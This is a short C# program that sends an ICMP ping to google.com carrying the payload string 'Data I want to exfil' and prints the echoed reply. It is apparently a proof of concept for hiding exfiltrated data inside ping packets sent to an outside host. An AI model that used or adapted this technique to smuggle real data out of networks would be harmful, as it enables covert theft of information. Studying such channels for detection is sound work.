using System;
using System.Net.NetworkInformation;
using System.Text;

namespace Hubes.Ping
{
    class Program
    {
        static void Main(string[] args)
        {
            System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping();
            PingOptions options = new PingOptions ();

            options.DontFragment = true;

            string data = "Data I want to exfil";
            byte[] buffer = Encoding.ASCII.GetBytes (data);
            int timeout = 120;
            
            PingReply reply = pingSender.Send ("google.com", timeout, buffer, options);
            if (reply.Status == IPStatus.Success)
            {
                Console.WriteLine ("Address: {0}", reply.Address);
                Console.WriteLine ("RoundTrip time: {0}", $"{reply.RoundtripTime}ms");
                Console.WriteLine ("Buffer size: {0}", Encoding.ASCII.GetString(reply.Buffer));
            }
        }
    }
}